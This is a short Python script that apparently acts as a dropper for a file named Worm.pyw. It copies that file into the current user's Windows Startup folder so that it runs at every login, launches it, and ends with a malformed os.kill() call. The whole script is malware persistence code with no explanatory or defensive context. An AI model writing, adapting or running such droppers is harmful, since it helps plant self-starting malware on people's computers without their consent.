import subprocess,os
from shutil import copyfile
import getpass
user=getpass.getuser()
try:
    os.popen("""xcopy %CD%\\Worm.pyw "C:\\Users\\"""+user+"""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" """)
    os.popen('start Worm.pyw')
except:
    os.popen('start Worm.pyw')
    
os.kill()

